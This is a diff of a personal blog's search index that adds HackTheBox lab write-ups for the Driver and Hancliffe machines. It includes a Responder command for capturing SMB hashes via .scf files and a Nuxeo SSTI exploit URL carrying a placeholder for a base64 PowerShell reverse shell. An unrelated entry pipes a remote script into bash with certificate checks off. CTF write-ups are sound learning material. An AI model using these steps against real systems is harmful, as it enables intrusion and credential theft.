@@ -1054,8 +1054,10 @@ sudo composer --working-dir=$TF run-script x
   <entry>
     <title>HackTheBox-Driver</title>
     <url>/2021/12/07/HackTheBox-Driver/</url>
-    <content><![CDATA[<h4 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h4><p><img src="https://s2.loli.net/2021/12/09/PnN9TEv613QDLxH.png" alt="image-20211209160701979"></p>
-<h4 id="Find-User-Flag"><a href="#Find-User-Flag" class="headerlink" title="Find User Flag"></a>Find User Flag</h4><p>After many enumerating testing and searching, my friend told me it was <a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">SMB share .scf file attacks</a> which I’ve never heard before.</p>
+    <content><![CDATA[<p>![image-20211209192725384](/Users/fre4k5en/Library/Application Support/typora-user-images/image-20211209192725384.png)</p>
+<h4 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h4><p><img src="https://s2.loli.net/2021/12/09/PnN9TEv613QDLxH.png" alt="image-20211209160701979"></p>
+<h4 id="Find-User-Flag"><a href="#Find-User-Flag" class="headerlink" title="Find User Flag"></a>Find User Flag</h4><p>We can access website with admin:admin on port 80, there is a firmware update function, we can upload file with it, but I didn’t find any path made me access my reverse php shell</p>
+<p>After many enumerating testing and searching, my friend told me it was <a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">SMB share .scf file attacks</a> which I’ve never heard before.</p>
 <p>Shout out to my bro</p>
 <p>So let’s do it as operation in the article, use <a href="https://github.com/SpiderLabs/Responder">Responder</a> to listen</p>
 <figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">./Responder.py</span> -wrf <span class="params">--lm</span> -v -I tun0</span><br></pre></td></tr></table></figure>
@@ -1105,6 +1107,28 @@ sudo composer --working-dir=$TF run-script x
     <url>/2021/11/24/Testing%20Hardware/</url>
     <content><![CDATA[<p>Testing Hardware</p>
 <p>wget -qO- –no-check-certificate <a href="https://raw.githubusercontent.com/oooldking/script/master/superbench.sh">https://raw.githubusercontent.com/oooldking/script/master/superbench.sh</a> | bash</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>HackTheBox-Hancliffe</title>
+    <url>/2021/12/13/HackTheBox-Hancliffe/</url>
+    <content><![CDATA[<h4 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h4><p><img src="https://s2.loli.net/2021/12/13/IKjvmi8WlTJtY4E.png" alt="image-20211213112132094"></p>
+<p>Check 80, nothing was found</p>
+<p><img src="https://s2.loli.net/2021/12/14/KP61vGDgSdeBRkb.png" alt="image-20211214131311124"></p>
+<p>Check 8000, there is a website which could generate a complicated password by input basic information. And with the same input of information, website will always return the same password.</p>
+<p><img src="https://s2.loli.net/2021/12/13/hLSFrmMxczZnOdU.png" alt="image-20211213120619436"></p>
+<p>Check 9999, there is a console of abyss CMS</p>
+<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">SF-Port9999-TCP:V=7.80<span class="variable">%I=7%</span>D=12/13<span class="variable">%Time=61B6BA32%</span>P=x86_64-pc-linux-gnu<span class="variable">%r(N</span></span><br><span class="line"><span class="variable">SF:ULL,27,&quot;Welcome\x20Brankas\x20Application\.\nUsername:\x20&quot;)%</span>r(GetReque</span><br><span class="line">SF:st,31,&quot;Welcome<span class="symbol">\x</span>20Brankas<span class="symbol">\x</span>20Application<span class="symbol">\.</span><span class="symbol">\n</span>Username:<span class="symbol">\x</span>20Password:<span class="symbol">\x</span>20&quot;</span><br><span class="line">SF:)<span class="variable">%r(HTTPOptions,31,&quot;Welcome\x20Brankas\x20Application\.\nUsername:\x20P</span></span><br><span class="line"><span class="variable">SF:assword:\x20&quot;)%</span>r(FourOhFourRequest,31,&quot;Welcome<span class="symbol">\x</span>20Brankas<span class="symbol">\x</span>20Applicatio</span><br><span class="line">SF:n<span class="symbol">\.</span><span class="symbol">\n</span>Username:<span class="symbol">\x</span>20Password:<span class="symbol">\x</span>20&quot;)<span class="variable">%r(JavaRMI,31,&quot;Welcome\x20Brankas\x20A</span></span><br><span class="line"><span class="variable">SF:pplication\.\nUsername:\x20Password:\x20&quot;)%</span>r(GenericLines,31,&quot;Welcome<span class="symbol">\x</span></span><br><span class="line">SF:20Brankas<span class="symbol">\x</span>20Application<span class="symbol">\.</span><span class="symbol">\n</span>Username:<span class="symbol">\x</span>20Password:<span class="symbol">\x</span>20&quot;)<span class="variable">%r(RTSPRequest,</span></span><br><span class="line"><span class="variable">SF:31,&quot;Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20&quot;)%</span>r</span><br><span class="line">SF:(RPCCheck,31,&quot;Welcome<span class="symbol">\x</span>20Brankas<span class="symbol">\x</span>20Application<span class="symbol">\.</span><span class="symbol">\n</span>Username:<span class="symbol">\x</span>20Passwor</span><br><span class="line">SF:d:<span class="symbol">\x</span>20&quot;)<span class="variable">%r(DNSVersionBindReqTCP,31,&quot;Welcome\x20Brankas\x20Application\.</span></span><br><span class="line"><span class="variable">SF:\nUsername:\x20Password:\x20&quot;)%</span>r(DNSStatusRequestTCP,31,&quot;Welcome<span class="symbol">\x</span>20Bra</span><br><span class="line">SF:nkas<span class="symbol">\x</span>20Application<span class="symbol">\.</span><span class="symbol">\n</span>Username:<span class="symbol">\x</span>20Password:<span class="symbol">\x</span>20&quot;)<span class="variable">%r(Help,31,&quot;Welcome\</span></span><br><span class="line"><span class="variable">SF:x20Brankas\x20Application\.\nUsername:\x20Password:\x20&quot;)%</span>r(SSLSessionR</span><br><span class="line">SF:eq,31,&quot;Welcome<span class="symbol">\x</span>20Brankas<span class="symbol">\x</span>20Application<span class="symbol">\.</span><span class="symbol">\n</span>Username:<span class="symbol">\x</span>20Password:<span class="symbol">\x</span>20&quot;</span><br><span class="line">SF:)<span class="variable">%r(TerminalServerCookie,31,&quot;Welcome\x20Brankas\x20Application\.\nUsern</span></span><br><span class="line"><span class="variable">SF:ame:\x20Password:\x20&quot;)%</span>r(TLSSessionReq,31,&quot;Welcome<span class="symbol">\x</span>20Brankas<span class="symbol">\x</span>20Appli</span><br><span class="line">SF:cation<span class="symbol">\.</span><span class="symbol">\n</span>Username:<span class="symbol">\x</span>20Password:<span class="symbol">\x</span>20&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2021/12/14/5ve6rKJuFQAXlMD.png" alt="image-20211214131431844"></p>
+<h4 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h4><p>Run dirscan on 80 and 8000, I found a interesting directory Maintenance, when I access it, will redirect to <a href="http://hancliffe.htb/nuxeo/Maintenance/">http://hancliffe.htb/nuxeo/Maintenance/</a> , so there is a <a href="https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/">path traversal via misconfigured</a></p>
+<p>The CMS nuxeo has a SSTI vulnerability which is exist on this host</p>
+<p><img src="https://s2.loli.net/2021/12/14/4MV28fnOHuXemjW.png" alt="image-20211214101439166"></p>
+<p>Start listening and then we run the exp</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>hancliffe.htb<span class="regexp">/maintenance/</span>..;<span class="regexp">/login.jsp/</span>anything<span class="variable">$&#123;THE POWERSHELL REVERSE ENCODED BY BASE64&#125;</span>.xhtml</span><br></pre></td></tr></table></figure>
+
+<p>So we have svc_account now</p>
+<p><img src="https://s2.loli.net/2021/12/14/WT2UXPhobDy9nK4.png" alt="image-20211214101426809"></p>
 ]]></content>
   </entry>
 </search>
